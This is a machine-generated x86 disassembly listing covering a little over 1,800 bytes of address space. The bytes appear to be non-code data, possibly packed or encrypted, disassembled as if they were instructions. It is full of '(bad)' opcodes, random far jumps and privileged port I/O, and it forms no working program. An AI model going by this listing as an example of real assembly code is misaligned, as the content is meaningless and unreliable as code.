  41a70d:	fdiv   DWORD PTR [esi+0xa5e30d2]
  41a713:	or     BYTE PTR [ecx+0x66007f46],bh
  41a719:	stos   BYTE PTR es:[edi],al
  41a71a:	test   eax,0x58916373
  41a71f:	(bad)  
  41a720:	out    0x29,al
  41a722:	push   eax
  41a723:	aam    0x46
  41a725:	(bad)  
  41a726:	(bad)  [ecx]
  41a728:	ins    DWORD PTR es:[edi],dx
  41a729:	jp     0x41a77e
  41a72b:	mov    DWORD PTR [edx*1-0x633e2d8b],edi
  41a732:	jne    0x41a6bd
  41a734:	in     al,dx
  41a735:	rcr    DWORD PTR [eax+0x4],1
  41a738:	push   ebx
  41a739:	push   ecx
  41a73a:	and    edx,eax
  41a73c:	jae    0x41a725
  41a73e:	inc    ecx
  41a73f:	jg     0x41a728
  41a741:	cmp    al,bh
  41a743:	xor    BYTE PTR [edi+0x20bcec53],al
  41a749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a74a:	jg     0x41a70c
  41a74c:	imul   ecx,DWORD PTR [ecx+0x55],0xffffff8c
  41a750:	jl     0x41a7c9
  41a752:	out    dx,al
  41a753:	and    al,0xd8
  41a755:	call   0xdcc2:0x44cba994
  41a75c:	sahf   
  41a75d:	or     DWORD PTR [edi+0x62],esi
  41a760:	mov    eax,ds:0x3243cf6b
  41a765:	loope  0x41a7a9
  41a767:	imul   edx,DWORD PTR [ecx+edx*1+0xdc9dfd2],0xe3cb46a7
  41a772:	jb     0x41a7d3
  41a774:	xchg   ecx,eax
  41a775:	sub    eax,0xf75e1c76
  41a77a:	mov    edx,0x3b569e41
  41a77f:	jmp    0x1793:0x172c00b1
  41a786:	fidivr DWORD PTR [edx-0x2]
  41a789:	cli    
  41a78a:	test   BYTE PTR [edi-0x5bacab9d],cl
  41a790:	mov    BYTE PTR [ecx-0x1257b242],ch
  41a796:	jl     0x41a74b
  41a798:	push   ebx
  41a799:	mov    ecx,0x1ca5cc7a
  41a79e:	ja     0x41a762
  41a7a0:	pop    esp
  41a7a1:	loope  0x41a7a2
  41a7a3:	or     eax,ebx
  41a7a5:	mov    ebx,0x5159aeb9
  41a7aa:	(bad)  
  41a7ab:	sub    edx,0x6c
  41a7ae:	outs   dx,DWORD PTR ds:[esi]
  41a7af:	aad    0xe3
  41a7b1:	xchg   ebx,eax
  41a7b2:	cs mov ch,0xd4
  41a7b5:	retf   0x5aab
  41a7b8:	imul   esi,ebx,0xffffffef
  41a7bb:	sbb    ebp,esi
  41a7bd:	bts    DWORD PTR [edx-0x4],eax
  41a7c1:	(bad)  
  41a7c2:	test   BYTE PTR [edx-0x12],0x46
  41a7c6:	push   esp
  41a7c7:	mov    eax,0xee4d9cb9
  41a7cc:	dec    ecx
  41a7cd:	jb     0x41a74f
  41a7cf:	push   ds
  41a7d0:	ins    BYTE PTR es:[edi],dx
  41a7d1:	es mov cl,0x6a
  41a7d4:	fmul   DWORD PTR [edi]
  41a7d6:	cwde   
  41a7d7:	std    
  41a7d8:	pop    ss
  41a7d9:	jno    0x41a813
  41a7db:	jb     0x41a76c
  41a7dd:	push   ecx
  41a7de:	(bad)  
  41a7df:	dec    ebp
  41a7e0:	and    edx,esi
  41a7e2:	push   ebx
  41a7e3:	cs jl  0x41a846
  41a7e6:	cmc    
  41a7e7:	out    dx,al
  41a7e8:	leave  
  41a7e9:	out    0xc2,al
  41a7eb:	mov    ebx,0xf8fd24c3
  41a7f0:	inc    esi
  41a7f2:	mov    bl,0x24
  41a7f4:	xchg   BYTE PTR [esi+0x4c8535e0],bl
  41a7fa:	push   edi
  41a7fb:	jbe    0x41a7c0
  41a7fd:	scas   al,BYTE PTR es:[edi]
  41a7fe:	retf   0xe386
  41a801:	and    eax,0x5a15f299
  41a806:	or     BYTE PTR [ecx+edx*8+0x63a1bf30],bl
  41a80d:	test   DWORD PTR [ebp+ebp*4+0x8],ecx
  41a811:	int    0x4
  41a813:	dec    esp
  41a814:	outs   dx,BYTE PTR ds:[esi]
  41a815:	mul    DWORD PTR [edi-0x3d]
  41a818:	xor    bh,bh
  41a81a:	loop   0x41a832
  41a81c:	and    DWORD PTR [edx+0x17],edx
  41a81f:	sbb    BYTE PTR [edi+0x4035c2e3],0x49
  41a826:	inc    esp
  41a827:	cmc    
  41a828:	jmp    FWORD PTR [ecx+esi*1+0x5debcde1]
  41a82f:	xchg   ebx,eax
  41a830:	test   DWORD PTR [eax-0x48],esi
  41a833:	cmp    ebx,DWORD PTR [edx-0x3f]
  41a836:	sbb    DWORD PTR [ebx-0x7badfb1d],ebx
  41a83c:	sbb    ah,BYTE PTR ds:0xfd97a617
  41a842:	fadd   DWORD PTR [esi+ebp*1-0x349fd1c1]
  41a849:	xchg   edi,eax
  41a84a:	cmc    
  41a84b:	add    eax,0x76bc8f64
  41a850:	repnz pop esp
  41a852:	adc    DWORD PTR [ebp+0x79],eax
  41a855:	mov    al,0xe2
  41a857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a858:	and    eax,0x8a2f4aaa
  41a85d:	adc    DWORD PTR [eax-0x45adf55d],esp
  41a863:	mov    eax,ds:0x172ffb3b
  41a868:	pop    edx
  41a869:	sbb    esi,DWORD PTR [ebx+0x15]
  41a86c:	push   ds
  41a86d:	mov    ch,0xd5
  41a86f:	dec    edi
  41a870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a871:	shl    BYTE PTR [ebx+0xb6f1526],cl
  41a877:	fs loope 0x41a838
  41a87a:	icebp  
  41a87b:	(bad)  
  41a87c:	pop    edx
  41a87d:	retf   
  41a87e:	popf   
  41a87f:	cs add eax,0xac286704
  41a885:	add    esp,esi
  41a887:	mov    bh,0x26
  41a889:	dec    ecx
  41a88a:	js     0x41a8d3
  41a88c:	cmp    DWORD PTR [edx-0x5f],0x5b0dc6ad
  41a893:	retf   
  41a894:	fidivr DWORD PTR [edi+edx*2-0x24]
  41a898:	mov    dh,0xaf
  41a89a:	scas   al,BYTE PTR es:[edi]
  41a89b:	jmp    0x3c10:0xbcd44b4
  41a8a2:	test   BYTE PTR [edi],bl
  41a8a4:	mov    edi,0x57da71dc
  41a8a9:	add    eax,0x20d90c39
  41a8ae:	sub    esi,DWORD PTR [edx]
  41a8b0:	jae    0x41a90f
  41a8b2:	push   ecx
  41a8b3:	aas    
  41a8b4:	dec    ebp
  41a8b5:	xor    dh,bl
  41a8b7:	or     ecx,DWORD PTR [esi+0x5]
  41a8ba:	in     eax,0xdd
  41a8bc:	(bad)  
  41a8bd:	loope  0x41a8e1
  41a8bf:	push   ebp
  41a8c0:	fsubr  st,st(0)
  41a8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c3:	dec    edi
  41a8c4:	sub    DWORD PTR [eax-0x70],0xffffff8d
  41a8c8:	jns    0x41a90b
  41a8ca:	sub    bl,BYTE PTR [esi+esi*1]
  41a8cd:	push   es
  41a8ce:	ja     0x41a92b
  41a8d0:	leave  
  41a8d1:	push   0xffffffba
  41a8d3:	push   ebp
  41a8d4:	clc    
  41a8d5:	ins    BYTE PTR es:[edi],dx
  41a8d6:	push   cs
  41a8d7:	mov    ebp,0xbb87e109
  41a8dc:	push   es
  41a8dd:	mov    dl,0x26
  41a8df:	xor    esp,DWORD PTR [ebx-0x7673740b]
  41a8e5:	outs   dx,DWORD PTR ds:[esi]
  41a8e6:	jo     0x41a955
  41a8e8:	mov    ah,0x7c
  41a8ea:	mov    al,ds:0x2e4501d5
  41a8ef:	mov    BYTE PTR [esi],cl
  41a8f1:	push   es
  41a8f2:	sub    BYTE PTR [esp+esi*8+0x1d],ch
  41a8f6:	fistp  WORD PTR [edx-0x6a]
  41a8f9:	mov    ch,0xba
  41a8fb:	loope  0x41a889
  41a8fd:	sub    ecx,edx
  41a8ff:	and    ebx,DWORD PTR [ebx]
  41a901:	clc    
  41a902:	xchg   edx,eax
  41a903:	icebp  
  41a904:	xlat   BYTE PTR ds:[ebx]
  41a905:	jmp    0x41a90a
  41a907:	ret    0x613d
  41a90a:	jge    0x41a8c2
  41a90c:	aaa    
  41a90d:	sub    eax,0x6c885314
  41a912:	imul   edx,DWORD PTR ds:0xdbb515ec,0x42e6f8dd
  41a91c:	or     ebp,DWORD PTR [ebx-0x4e]
  41a91f:	cmp    al,BYTE PTR [eax+0x561389bb]
  41a925:	pop    esp
  41a926:	inc    ecx
  41a927:	or     DWORD PTR [ebx],esi
  41a929:	out    dx,al
  41a92a:	push   eax
  41a92b:	cs jbe 0x41a914
  41a92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a92f:	retf   
  41a930:	clc    
  41a931:	adc    cl,ch
  41a933:	cdq    
  41a934:	out    dx,eax
  41a935:	jmp    0x41a8e4
  41a937:	jecxz  0x41a9a3
  41a939:	xchg   ebx,eax
  41a93a:	pop    eax
  41a93b:	jno    0x41a9af
  41a93d:	adc    eax,0x8669e181
  41a942:	shr    DWORD PTR [ebp+0x3100a729],1
  41a948:	les    ebx,FWORD PTR [ebx]
  41a94a:	jl     0x41a90f
  41a94c:	pop    ebp
  41a94d:	mov    esp,0xfb4a7f64
  41a952:	mov    ds:0x10b32f0b,al
  41a957:	nop
  41a958:	push   cs
  41a959:	mov    ch,ch
  41a95b:	mov    ds:0xac8c8efc,eax
  41a960:	loope  0x41a94e
  41a962:	mov    eax,0x96b088b7
  41a967:	push   ecx
  41a968:	js     0x41a8f5
  41a96a:	mov    eax,0x9cab49c4
  41a96f:	xchg   esp,eax
  41a970:	lahf   
  41a971:	fwait
  41a972:	jp     0x41a9c7
  41a974:	mov    eax,0xbebd83d3
  41a979:	gs jae 0x41a9b2
  41a97c:	inc    ebp
  41a97d:	xor    eax,0x87c3b205
  41a982:	inc    edx
  41a983:	ds loop 0x41a94e
  41a986:	mov    ds:0x785c5610,eax
  41a98b:	fs jecxz 0x41a979
  41a98e:	shr    bl,cl
  41a990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a992:	lea    eax,[ebx+0x109807aa]
  41a998:	les    ebx,FWORD PTR [esi-0x53d8a9b8]
  41a99e:	xor    eax,0x6cba82f1
  41a9a3:	push   edi
  41a9a4:	in     eax,0xc0
  41a9a6:	mov    bl,0xc0
  41a9a8:	aad    0x4a
  41a9aa:	xchg   ecx,eax
  41a9ab:	cmp    al,BYTE PTR ds:0x601213b9
  41a9b1:	xchg   ebx,eax
  41a9b2:	xor    BYTE PTR [edx-0x17],bh
  41a9b5:	dec    esi
  41a9b6:	mov    al,ds:0x8ae03030
  41a9bb:	call   0xca16c1b
  41a9c0:	(bad)  
  41a9c1:	mov    esp,0xb42dda60
  41a9c6:	scas   eax,DWORD PTR es:[edi]
  41a9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9c8:	mov    cl,0x4a
  41a9ca:	xchg   edi,eax
  41a9cb:	add    eax,0x617d77f7
  41a9d0:	jg     0x41aa06
  41a9d2:	or     eax,0xeaf010a5
  41a9d7:	dec    edi
  41a9d8:	pushf  
  41a9d9:	popf   
  41a9da:	sbb    DWORD PTR [ebp+0x75fef1dd],esp
  41a9e0:	dec    edi
  41a9e1:	out    dx,al
  41a9e2:	hlt    
  41a9e3:	sbb    BYTE PTR [esi],ch
  41a9e5:	leave  
  41a9e6:	inc    esi
  41a9e7:	(bad)  
  41a9e8:	clc    
  41a9e9:	mov    esp,0x74418c87
  41a9ee:	aad    0x70
  41a9f0:	mov    al,ds:0xb8c47ff8
  41a9f5:	xchg   ebx,eax
  41a9f6:	or     BYTE PTR [edx-0x17],bh
  41a9f9:	inc    ebx
  41a9fa:	fsubr  st,st(7)
  41a9fd:	or     DWORD PTR [edx-0x42],edx
  41aa00:	mov    ch,0xe6
  41aa02:	pusha  
  41aa03:	loope  0x41a9b9
  41aa05:	xchg   ecx,eax
  41aa06:	xchg   ecx,eax
  41aa07:	data16 sub al,0x47
  41aa0a:	nop
  41aa0b:	or     ch,ah
  41aa0d:	push   edi
  41aa0e:	mov    ecx,0xdaff5c6f
  41aa13:	mov    esp,0xfab31df0
  41aa18:	ror    edi,1
  41aa1a:	mov    edx,0x7e1c9d7d
  41aa1f:	mov    dl,0xaf
  41aa21:	je     0x41aa15
  41aa23:	lea    esi,[ebx-0x2b5b4bb5]
  41aa29:	add    BYTE PTR [edx-0x79],ah
  41aa2c:	ss cmp esp,ecx
  41aa2f:	adc    BYTE PTR [eax+0x5d94a56e],al
  41aa35:	sbb    al,0x53
  41aa37:	cmp    ebp,ebx
  41aa39:	into   
  41aa3a:	loop   0x41a9ca
  41aa3c:	cwde   
  41aa3d:	adc    DWORD PTR [ecx-0x16eb3be2],0x39638104
  41aa47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa48:	ds cdq 
  41aa4a:	add    ch,bh
  41aa4c:	loopne 0x41aa57
  41aa4e:	js     0x41aa83
  41aa50:	out    dx,al
  41aa51:	jp     0x41aa12
  41aa53:	popf   
  41aa54:	cmp    bh,dl
  41aa56:	xchg   edx,eax
  41aa57:	leave  
  41aa58:	out    dx,eax
  41aa59:	bound  ebp,QWORD PTR [ebx]
  41aa5b:	(bad)  
  41aa5c:	or     BYTE PTR [edx+0x3b],bl
  41aa5f:	loopne 0x41aa99
  41aa61:	push   esp
  41aa62:	aaa    
  41aa63:	pop    ecx
  41aa64:	loope  0x41aab2
  41aa66:	pop    es
  41aa67:	jl     0x41aa0f
  41aa69:	ins    BYTE PTR es:[edi],dx
  41aa6a:	mov    al,ds:0x29eeb35a
  41aa6f:	fld    DWORD PTR [esi+0x7b38ed21]
  41aa75:	add    DWORD PTR [esi-0x2c61ea7f],edx
  41aa7b:	leave  
  41aa7c:	xor    DWORD PTR [edx+0x50c1a9c8],ebp
  41aa82:	push   cs
  41aa83:	inc    edx
  41aa84:	je     0x41aa5b
  41aa86:	or     al,0x54
  41aa88:	shl    esp,1
  41aa8a:	sub    bh,BYTE PTR [esi]
  41aa8c:	ds sbb eax,eax
  41aa8f:	push   cs
  41aa90:	xchg   edi,eax
  41aa91:	mov    DWORD PTR [edx],esp
  41aa93:	int3   
  41aa94:	imul   esi,DWORD PTR [ebx-0x78],0x39de197
  41aa9b:	mov    ecx,DWORD PTR [ecx]
  41aa9d:	arpl   WORD PTR [esi],bp
  41aa9f:	popf   
  41aaa0:	xchg   edx,eax
  41aaa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaa2:	xor    ebx,DWORD PTR [edi+ebp*1+0x5369a491]
  41aaa9:	mov    BYTE PTR [eax+0x5c],bh
  41aaac:	cmc    
  41aaad:	in     eax,dx
  41aaae:	dec    edx
  41aaaf:	add    ecx,esi
  41aab1:	sub    eax,0x49d07b1f
  41aab6:	jbe    0x41ab0a
  41aab8:	imul   edi,ebp,0xffffffee
  41aabb:	enter  0xd14e,0x4b
  41aabf:	adc    eax,0x51
  41aac2:	mov    ebp,es
  41aac4:	lods   eax,DWORD PTR ds:[esi]
  41aac5:	adc    cl,bh
  41aac7:	mov    BYTE PTR [eax-0xd],cl
  41aaca:	fimul  WORD PTR [edi+0x5dc776ba]
  41aad0:	lahf   
  41aad1:	cmp    DWORD PTR [esi],edi
  41aad3:	cmp    dl,ah
  41aad5:	icebp  
  41aad6:	add    BYTE PTR [ecx],ch
  41aad8:	xchg   DWORD PTR [esi+0x37],ebx
  41aadb:	dec    ecx
  41aadc:	or     BYTE PTR [edx],0xef
  41aadf:	gs push 0xe9e93f9d
  41aae5:	jmp    0x90f6:0x93b34800
  41aaec:	cmp    BYTE PTR [eax-0x21e02787],bl
  41aaf2:	xor    ah,bh
  41aaf4:	leave  
  41aaf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaf6:	in     eax,0xfb
  41aaf8:	(bad)  
  41aaf9:	shl    DWORD PTR [edi],0xbf
  41aafc:	jns    0x41aab5
  41aafe:	ja     0x41aa96
  41ab00:	cmp    eax,DWORD PTR [eax]
  41ab02:	xchg   DWORD PTR [edx],esp
  41ab04:	xor    edi,DWORD PTR [ecx-0x5a]
  41ab07:	and    al,0x20
  41ab09:	loope  0x41aa97
  41ab0b:	jmp    0x490b36a
  41ab10:	push   es
  41ab11:	inc    esi
  41ab12:	and    BYTE PTR [eax],dl
  41ab14:	mov    ch,0xa5
  41ab16:	int    0x6f
  41ab18:	and    bl,cl
  41ab1a:	div    DWORD PTR [eax+edx*2+0x43583b02]
  41ab21:	in     al,0x9a
  41ab23:	push   esi
  41ab24:	and    eax,0x11c2d2bf
  41ab29:	cmp    eax,0x46689c05
  41ab2e:	jno    0x41ab50
  41ab30:	jmp    0x41ab0a
  41ab32:	mov    cl,0xf
  41ab34:	adc    eax,DWORD PTR [ebp+0x76b1cf2a]
  41ab3a:	add    DWORD PTR [esi],eax
  41ab3c:	sub    eax,0xd417b383
  41ab41:	xchg   edx,eax
  41ab42:	test   al,0x87
  41ab44:	adc    al,0x63
  41ab46:	enter  0x52c,0x61
  41ab4a:	shl    BYTE PTR [esi],1
  41ab4c:	into   
  41ab4d:	cmp    dl,BYTE PTR [edi]
  41ab4f:	inc    eax
  41ab50:	jmp    0x41ab7c
  41ab52:	ss arpl sp,dx
  41ab55:	mov    BYTE PTR [esi],ah
  41ab57:	xchg   edi,eax
  41ab58:	mov    eax,0xbfadbaac
  41ab5d:	out    0x38,al
  41ab5f:	inc    eax
  41ab60:	pop    edx
  41ab61:	ins    DWORD PTR es:[edi],dx
  41ab62:	leave  
  41ab63:	fmul   DWORD PTR ds:0x50aae971
  41ab69:	dec    ebx
  41ab6a:	mov    esp,0x54eb67c3
  41ab6f:	pop    ds
  41ab70:	adc    cl,al
  41ab72:	ss stos BYTE PTR es:[edi],al
  41ab74:	jns    0x41abc0
  41ab76:	sub    eax,0x9fc8f5c3
  41ab7b:	call   0x6f12:0x9bd09a4b
  41ab82:	pop    es
  41ab83:	push   0x4029be06
  41ab88:	ret    
  41ab89:	int3   
  41ab8a:	mov    dh,0xbc
  41ab8c:	xor    DWORD PTR [ecx],ecx
  41ab8e:	sub    ebx,DWORD PTR [ecx]
  41ab90:	(bad)  
  41ab91:	adc    edi,esp
  41ab93:	cli    
  41ab94:	and    bl,BYTE PTR [ebx]
  41ab96:	push   ebx
  41ab97:	jbe    0x41ac00
  41ab99:	icebp  
  41ab9a:	test   DWORD PTR [ecx+0x5a],esi
  41ab9d:	cli    
  41ab9e:	rol    DWORD PTR [ecx+0x785c6504],0x3a
  41aba5:	adc    DWORD PTR [ecx+eax*1],eax
  41aba8:	jmp    0x41ab38
  41abaa:	popf   
  41abab:	call   0x36f0e616
  41abb0:	fiadd  DWORD PTR [di-0x78c]
  41abb5:	push   edi
  41abb6:	adc    BYTE PTR [edi-0x611a535],dh
  41abbc:	fwait
  41abbd:	loope  0x41ac29
  41abbf:	repz and eax,0x9ae292d9
  41abc5:	retf   0x88b4
  41abc8:	call   0x45068c85
  41abcd:	add    al,0x2b
  41abcf:	and    al,0xea
  41abd1:	push   edi
  41abd2:	inc    ebx
  41abd3:	xchg   esi,eax
  41abd4:	lods   eax,DWORD PTR ds:[esi]
  41abd5:	add    ah,cl
  41abd7:	test   DWORD PTR [edi-0x19470937],ebx
  41abdd:	sti    
  41abde:	mov    ?,WORD PTR [ebp-0x6]
  41abe1:	mov    ?,WORD PTR [edx]
  41abe3:	out    0xd3,al
  41abe5:	jns    0x41ac0f
  41abe7:	int3   
  41abe8:	gs xchg ebp,eax
  41abea:	jae    0x41ac03
  41abec:	shr    DWORD PTR [ebx-0x17],1
  41abef:	fwait
  41abf0:	xor    eax,0xbf14da47
  41abf5:	sbb    esi,DWORD PTR [ebp+ebp*2+0x32]
  41abf9:	push   ebp
  41abfa:	enter  0x307,0xf8
  41abfe:	stc    
  41abff:	adc    DWORD PTR [edi],edx
  41ac01:	sbb    bh,BYTE PTR [edx]
  41ac03:	add    cl,bh
  41ac05:	das    
  41ac06:	dec    esp
  41ac07:	test   eax,0x5a49d706
  41ac0c:	cwde   
  41ac0d:	jo     0x41abd3
  41ac0f:	rol    BYTE PTR [edi],cl
  41ac11:	xchg   ecx,eax
  41ac12:	jns    0x41ac59
  41ac14:	scas   al,BYTE PTR es:[edi]
  41ac15:	test   dl,dl
  41ac17:	sbb    BYTE PTR [ecx+ecx*2],dl
  41ac1a:	(bad)  
  41ac1c:	bound  eax,QWORD PTR [ecx+0x76]
  41ac1f:	(bad)  
  41ac20:	aas    
  41ac21:	out    dx,eax
  41ac22:	pop    eax
  41ac23:	mov    al,0xd9
  41ac25:	mov    esi,0x42f0875d
  41ac2a:	dec    esi
  41ac2b:	aas    
  41ac2c:	sub    BYTE PTR [ebx+ebx*1-0x4b0b378d],ah
  41ac33:	jmp    0x9efa:0x63a4250
  41ac3a:	push   eax
  41ac3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac3c:	enter  0x2862,0x94
  41ac40:	les    ecx,FWORD PTR [ecx+esi*8-0x69]
  41ac44:	fld    TBYTE PTR [ecx+esi*4+0x59]
  41ac48:	xchg   dh,al
  41ac4a:	xor    al,0xe3
  41ac4c:	pop    ss
  41ac4d:	pop    eax
  41ac4e:	dec    esi
  41ac4f:	dec    ecx
  41ac50:	mov    dh,0x2a
  41ac52:	xor    eax,0xdd9b6924
  41ac57:	sahf   
  41ac58:	dec    esi
  41ac59:	sbb    eax,0x5a230dd7
  41ac5e:	and    bl,BYTE PTR [edi+0x7c919111]
  41ac64:	aaa    
  41ac65:	sbb    BYTE PTR [ecx+0x15],dh
  41ac68:	test   DWORD PTR [edi+edx*1],ecx
  41ac6b:	mov    bl,0x2
  41ac6d:	push   cs
  41ac6e:	ficom  DWORD PTR [ecx]
  41ac70:	push   ebx
  41ac71:	inc    edi
  41ac72:	aaa    
  41ac73:	push   esp
  41ac74:	sbb    BYTE PTR [ebx],0x14
  41ac77:	or     al,0x67
  41ac79:	pop    es
  41ac7a:	push   esp
  41ac7b:	xchg   ebp,eax
  41ac7c:	fsubr  st,st(1)
  41ac7e:	cld    
  41ac7f:	pop    ds
  41ac80:	test   DWORD PTR ds:0x5b117bdc,ecx
  41ac86:	jmp    0x3e25e9b3
  41ac8b:	loop   0x41ac0e
  41ac8d:	jne    0x41ac79
  41ac8f:	in     al,dx
  41ac90:	pop    es
  41ac91:	inc    edi
  41ac92:	dec    ecx
  41ac93:	push   esi
  41ac94:	test   DWORD PTR [eax-0x1e9c8b18],eax
  41ac9a:	loopne 0x41ac2c
  41ac9c:	pop    ebp
  41ac9d:	push   ebx
  41ac9e:	es pop ds
  41aca0:	test   DWORD PTR [eax+esi*4],esp
  41aca3:	mov    ?,esi
  41aca5:	outs   dx,BYTE PTR ds:[esi]
  41aca6:	xchg   edx,eax
  41aca7:	gs stos BYTE PTR es:[edi],al
  41aca9:	xchg   esi,eax
  41acaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acab:	and    eax,0xc16fde32
  41acb0:	aaa    
  41acb1:	fnstsw WORD PTR [eax-0x1130c35e]
  41acb7:	push   ss
  41acb8:	xlat   BYTE PTR gs:[ebx]
  41acba:	sbb    BYTE PTR [edx],bh
  41acbc:	imul   ebp,edi,0x41
  41acbf:	fmulp  st(1),st
  41acc1:	test   al,0xa0
  41acc3:	pop    ebx
  41acc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acc5:	dec    ebp
  41acc6:	stc    
  41acc7:	iret   
  41acc8:	leave  
  41acc9:	mov    esi,0xc021ee97
  41acce:	adc    dl,ah
  41acd0:	icebp  
  41acd1:	mov    esi,0x4d60262e
  41acd6:	mul    DWORD PTR ds:0x4458cbe5
  41acdc:	clc    
  41acdd:	mov    ah,0x70
  41acdf:	bound  ebp,QWORD PTR [edx]
  41ace1:	fcmovb st,st(6)
  41ace3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41ace5:	xchg   ecx,eax
  41ace6:	jmp    0x41ad17
  41ace8:	nop
  41ace9:	out    0x76,al
  41aceb:	cmc    
  41acec:	sbb    al,0xf4
  41acee:	icebp  
  41acef:	push   es
  41acf0:	shl    BYTE PTR [esi],1
  41acf2:	inc    esi
  41acf3:	xchg   esi,eax
  41acf4:	out    dx,al
  41acf5:	retf   
  41acf6:	icebp  
  41acf7:	sahf   
  41acf8:	pop    edi
  41acf9:	sbb    dh,BYTE PTR [esi]
  41acfb:	xchg   edx,eax
  41acfc:	sti    
  41acfd:	test   al,0xfd
  41acff:	inc    edx
  41ad00:	mov    eax,ds:0x8ae2d114
  41ad05:	ja     0x41ace4
  41ad07:	ja     0x41ad16
  41ad09:	adc    al,0x2f
  41ad0b:	pushf  
  41ad0c:	test   al,0x99
  41ad0e:	mov    esp,es
  41ad10:	push   esi
  41ad11:	pop    DWORD PTR [edx+ecx*8+0x49841a06]
  41ad18:	push   ecx
  41ad19:	stc    
  41ad1a:	and    edx,DWORD PTR [edx-0x3c]
  41ad1d:	mov    ds:0x858443da,al
  41ad22:	sub    al,0x87
  41ad24:	shl    edx,1
  41ad26:	call   0x3bb1c6b9
  41ad2b:	jae    0x41ace9
  41ad2d:	stos   DWORD PTR es:[edi],eax
  41ad2e:	addr16 inc ecx
  41ad30:	jge    0x41acf1
  41ad32:	sar    BYTE PTR [eax],0x5e
  41ad35:	pop    esi
  41ad36:	fwait
  41ad37:	hlt    
  41ad38:	imul   ebp,esi,0xffffff9c
  41ad3b:	aas    
  41ad3c:	and    dl,ch
  41ad3e:	lea    edi,[esi-0x47]
  41ad41:	jp     0x41ace7
  41ad43:	scas   eax,DWORD PTR es:[edi]
  41ad44:	xor    al,0x63
  41ad46:	ins    DWORD PTR es:[edi],dx
  41ad47:	sti    
  41ad48:	jb     0x41acec
  41ad4a:	call   0x9ae5:0xce006f40
  41ad51:	adc    DWORD PTR [ecx],esp
  41ad53:	dec    ecx
  41ad54:	push   ecx
  41ad55:	shl    BYTE PTR [eax],0xef
  41ad58:	neg    edi
  41ad5a:	mov    ch,0x31
  41ad5c:	xor    al,0x7c
  41ad5e:	sub    DWORD PTR ss:[edx+0x4b],edi
  41ad62:	mov    esp,0x290c368d
  41ad67:	pop    eax
  41ad68:	into   
  41ad69:	lods   eax,DWORD PTR ds:[esi]
  41ad6a:	push   ebp
  41ad6b:	retf   0xfd52
  41ad6e:	fisttp QWORD PTR [eax+0x67]
  41ad71:	xor    eax,0x9d350287
  41ad76:	mov    edx,0xa292cbc8
  41ad7b:	fwait
  41ad7c:	adc    ah,BYTE PTR [esi]
  41ad7e:	push   esi
  41ad7f:	(bad)  [edx-0x19747a93]
  41ad85:	mov    esp,DWORD PTR [edx]
  41ad87:	add    ecx,DWORD PTR [eax+0x48bb56cc]
  41ad8d:	daa    
  41ad8e:	xchg   esp,eax
  41ad8f:	mov    ds:0x2324cc3,al
  41ad94:	jbe    0x41ad4d
  41ad96:	inc    DWORD PTR [edi+0x61]
  41ad99:	iret   
  41ad9a:	in     eax,dx
  41ad9b:	std    
  41ad9c:	call   0x5f4d6573
  41ada1:	jno    0x41ae03
  41ada3:	mov    cl,0x10
  41ada5:	jmp    0x41add5
  41ada7:	sti    
  41ada8:	popf   
  41ada9:	adc    DWORD PTR [edi-0x7abc0650],ebx
  41adaf:	adc    esp,DWORD PTR [ebx]
  41adb1:	cmp    eax,DWORD PTR [edx]
  41adb3:	xor    eax,0x535313bd
  41adb8:	mov    al,ds:0x93774d66
  41adbd:	aad    0xb4
  41adbf:	jmp    0x41ae09
  41adc1:	xchg   ecx,eax
  41adc2:	(bad)  
  41adc3:	adc    esp,esp
  41adc5:	cli    
  41adc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc7:	xor    BYTE PTR ds:0x16ec075a,dh
  41adcd:	xor    al,0xfa
  41adcf:	or     al,0xaf
  41add1:	ret    0x5fbe
  41add4:	iret   
  41add5:	xchg   DWORD PTR [ecx],ebx
  41add7:	xor    ebx,DWORD PTR [eax-0x73]
  41adda:	scas   eax,DWORD PTR es:[edi]
  41addb:	loope  0x41adce
  41addd:	shl    ecx,0xce
  41ade0:	iret   
  41ade1:	xchg   ebx,esi
  41ade3:	es jmp 0x41add9
  41ade6:	test   al,0x14
  41ade8:	or     cl,0x1a
  41adeb:	ss loop 0x41ad93
  41adee:	ss dec ecx
  41adf0:	xor    ecx,DWORD PTR [esi]
  41adf2:	mov    eax,0xb51a0bd1
  41adf7:	dec    edi
  41adf8:	jno    0x41ade0
  41adfa:	inc    ebp
  41adfb:	xchg   esi,eax
  41adfc:	inc    BYTE PTR [ecx+esi*1-0x47]
  41ae00:	out    0x45,al
  41ae02:	add    edx,edi
  41ae04:	adc    eax,0x89bf05c2
  41ae09:	sub    ch,BYTE PTR [edx]
  41ae0b:	jge    0x41adcc
  41ae0d:	enter  0xb5bf,0x97
  41ae11:	push   edx
  41ae12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae13:	repnz popf 
  41ae15:	fwait
  41ae16:	inc    eax
  41ae17:	inc    esp
  41ae18:	(bad)  
  41ae19:	pushf  
  41ae1a:	rcl    DWORD PTR [edx+0x3f77b79],0xd1
  41ae21:	test   ah,dh
  41ae23:	outs   dx,BYTE PTR ds:[esi]
  41ae24:	imul   eax,DWORD PTR [ebx-0x5b718983],0x36
  41ae2b:	mov    bl,0x9f
  41ae2d:	xor    al,0xc9
  41ae2f:	xor    eax,0xa8e8810e
  41ae34:	ins    BYTE PTR es:[edi],dx
  41ae35:	push   ebx
  41ae36:	xchg   ebp,eax
  41ae37:	jns    0x41aeb0
  41ae39:	sbb    eax,0xf62ba983
  41ae3e:	xchg   bh,al
  41ae40:	mov    al,0x5d
  41ae42:	xchg   edx,eax
